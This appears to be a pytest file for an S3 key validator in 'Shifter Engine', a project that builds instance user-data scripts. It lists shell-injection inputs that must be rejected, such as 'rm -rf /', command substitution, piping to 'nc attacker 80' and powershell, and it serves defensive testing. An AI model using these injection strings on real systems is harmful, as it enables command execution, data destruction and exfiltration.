"""Security validation tests for Shifter Engine.

Tests critical security functions:
- S3 path validation to prevent shell injection
- User data template safety
"""

import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

# Import the function under test (avoid duplicate implementations).
from components.instance import validate_s3_path


class TestValidateS3Path:
    """Tests for S3 path validation function."""

    # ==========================================================================
    # Happy Path Tests - Valid S3 Keys
    # ==========================================================================

    def test_valid_simple_key(self):
        """Valid simple S3 key should pass."""
        assert validate_s3_path("agents/installer.sh") is True

    def test_valid_key_with_dash(self):
        """Valid key with dashes should pass."""
        assert validate_s3_path("my-bucket/my-key.tar.gz") is True

    def test_valid_key_with_underscore(self):
        """Valid key with underscores should pass."""
        assert validate_s3_path("my_bucket/my_key.zip") is True

    def test_valid_key_with_dots(self):
        """Valid key with dots should pass."""
        assert validate_s3_path("path/file.tar.gz") is True

    def test_valid_key_with_equals(self):
        """Valid key with equals sign should pass (S3 metadata)."""
        assert validate_s3_path("path/file=value") is True

    def test_valid_nested_path(self):
        """Valid deeply nested path should pass."""
        assert validate_s3_path("a/b/c/d/e/file.txt") is True

    def test_valid_alphanumeric(self):
        """Valid alphanumeric key should pass."""
        assert validate_s3_path("agent123/v2/installer456") is True

    def test_valid_mixed_case(self):
        """Valid mixed case key should pass."""
        assert validate_s3_path("Agents/XDR/Installer.MSI") is True

    # ==========================================================================
    # Failure Tests - Shell Injection Attempts
    # ==========================================================================

    def test_invalid_key_semicolon(self):
        """Key with semicolon (command separator) should be rejected."""
        assert validate_s3_path("; rm -rf /") is False
        assert validate_s3_path("file; whoami") is False

    def test_invalid_key_backtick(self):
        """Key with backticks (command substitution) should be rejected."""
        assert validate_s3_path("`whoami`") is False
        assert validate_s3_path("file`id`") is False

    def test_invalid_key_dollar(self):
        """Key with dollar sign (variable/command expansion) should be rejected."""
        assert validate_s3_path("$(command)") is False
        assert validate_s3_path("$HOME/file") is False
        assert validate_s3_path("${PATH}") is False

    def test_invalid_key_pipe(self):
        """Key with pipe (command chaining) should be rejected."""
        assert validate_s3_path("file | cat") is False
        assert validate_s3_path("data|nc attacker 80") is False

    def test_invalid_key_ampersand(self):
        """Key with ampersand (background/chaining) should be rejected."""
        assert validate_s3_path("file && rm -rf") is False
        assert validate_s3_path("cmd & cmd2") is False

    def test_invalid_key_newline(self):
        """Key with newline should be rejected."""
        assert validate_s3_path("file\nrm -rf /") is False
        assert validate_s3_path("line1\r\nline2") is False

    def test_invalid_key_space(self):
        """Key with space should be rejected."""
        assert validate_s3_path("file with space") is False
        assert validate_s3_path(" leadingspace") is False

    def test_invalid_key_quotes(self):
        """Key with quotes should be rejected."""
        assert validate_s3_path('file"quote') is False
        assert validate_s3_path("file'quote") is False

    def test_invalid_key_angle_brackets(self):
        """Key with angle brackets (redirection) should be rejected."""
        assert validate_s3_path("file > /etc/passwd") is False
        assert validate_s3_path("file < input") is False

    def test_invalid_key_parentheses(self):
        """Key with parentheses (subshell) should be rejected."""
        assert validate_s3_path("(subshell)") is False

    def test_invalid_key_curly_braces(self):
        """Key with curly braces (brace expansion) should be rejected."""
        assert validate_s3_path("{a,b,c}") is False

    def test_invalid_key_square_brackets(self):
        """Key with square brackets (glob) should be rejected."""
        assert validate_s3_path("[abc]") is False

    def test_invalid_key_hash(self):
        """Key with hash (comment) should be rejected."""
        assert validate_s3_path("file#comment") is False

    def test_invalid_key_exclamation(self):
        """Key with exclamation (history expansion) should be rejected."""
        assert validate_s3_path("!important") is False

    def test_invalid_key_tilde(self):
        """Key with tilde (home dir) should be rejected."""
        assert validate_s3_path("~/file") is False

    def test_invalid_key_backslash(self):
        """Key with backslash (escape) should be rejected."""
        assert validate_s3_path("file\\ninjection") is False

    def test_invalid_key_at_sign(self):
        """Key with at sign should be rejected."""
        assert validate_s3_path("user@host") is False

    def test_invalid_key_percent(self):
        """Key with percent sign should be rejected."""
        assert validate_s3_path("100%complete") is False

    def test_invalid_key_caret(self):
        """Key with caret should be rejected."""
        assert validate_s3_path("file^2") is False

    def test_invalid_key_asterisk(self):
        """Key with asterisk (wildcard) should be rejected."""
        assert validate_s3_path("*.txt") is False

    def test_invalid_key_question_mark(self):
        """Key with question mark (wildcard) should be rejected."""
        assert validate_s3_path("file?.txt") is False

    def test_invalid_key_colon(self):
        """Key with colon should be rejected."""
        assert validate_s3_path("C:\\file") is False
        assert validate_s3_path("host:port") is False

    # ==========================================================================
    # Edge Case Tests
    # ==========================================================================

    def test_empty_key(self):
        """Empty key should return False."""
        assert validate_s3_path("") is False

    def test_only_safe_characters(self):
        """Key with only safe characters should pass."""
        assert validate_s3_path("abcABC123._/-=") is True

    def test_very_long_valid_key(self):
        """Very long but valid key should pass."""
        long_key = "a" * 500 + "/" + "b" * 500
        assert validate_s3_path(long_key) is True


class TestUserDataShellInjection:
    """Tests for shell injection prevention in user data generation.

    Note: Full InstanceComponent integration tests are in test_instance_component.py.
    These tests verify the validation logic that would be used.
    """

    def test_malicious_s3_key_detected_linux(self):
        """Malicious S3 key patterns should be detected for Linux victim."""
        malicious_keys = [
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "file && rm -rf /",
            "file | nc attacker 80",
        ]
        for key in malicious_keys:
            assert validate_s3_path(key) is False, f"Expected {key} to be rejected"

    def test_malicious_s3_key_detected_windows(self):
        """Malicious S3 key patterns should be detected for Windows victim."""
        malicious_keys = [
            "$(calc.exe)",
            "; powershell -c evil",
            "& whoami",
            "file | cmd.exe",
        ]
        for key in malicious_keys:
            assert validate_s3_path(key) is False, f"Expected {key} to be rejected"

    def test_safe_keys_allowed(self):
        """Safe S3 keys should be allowed."""
        safe_keys = [
            "agents/safe-key.tar.gz",
            "path/to/installer.msi",
            "v1.2.3/agent.exe",
            "PROD/agents/cortex_xdr_8.1.tar.gz",
        ]
        for key in safe_keys:
            assert validate_s3_path(key) is True, f"Expected {key} to be allowed"

    def test_presigned_url_characters_not_in_validation_scope(self):
        """Presigned URL validation is separate from S3 key validation.

        Presigned URLs are AWS-generated and contain special characters
        like '?' and '&' that are valid URL components. The validate_s3_path
        function is only for user-provided S3 keys, not full URLs.
        """
        # S3 keys should NOT contain URL query parameters
        # The actual presigned URL is passed separately
        assert validate_s3_path("bucket/key") is True
        # Full URLs would fail but that's expected - we don't pass URLs to this function
        assert validate_s3_path("https://s3.amazonaws.com/bucket/key?token=x") is False


class TestS3PathEdgeCases:
    """Additional edge cases for S3 path validation."""

    def test_unicode_characters(self):
        """Unicode characters should be rejected."""
        assert validate_s3_path("file\u0000null") is False
        assert validate_s3_path("emoji\U0001F600") is False

    def test_url_encoded_injection(self):
        """URL-encoded injection attempts should be rejected."""
        # %20 is space, %3B is semicolon
        assert validate_s3_path("file%20name") is False
        assert validate_s3_path("cmd%3Brm") is False

    def test_null_byte(self):
        """Null byte injection should be rejected."""
        assert validate_s3_path("file\x00.txt") is False

    def test_control_characters(self):
        """Control characters should be rejected."""
        assert validate_s3_path("file\t.txt") is False  # Tab
        assert validate_s3_path("file\r.txt") is False  # Carriage return

    def test_valid_s3_key_patterns(self):
        """Real-world valid S3 key patterns should pass."""
        valid_keys = [
            "agents/v1.2.3/xdr-agent.tar.gz",
            "users/12345/uploads/installer.sh",
            "PROD/agents/windows/cortex_xdr_8.1.msi",
            "artifacts/build-123/output.zip",
            "2024/01/15/backup.tar.gz",
            "a-b_c.d/e-f_g.h",
        ]
        for key in valid_keys:
            assert validate_s3_path(key) is True, f"Expected {key} to be valid"
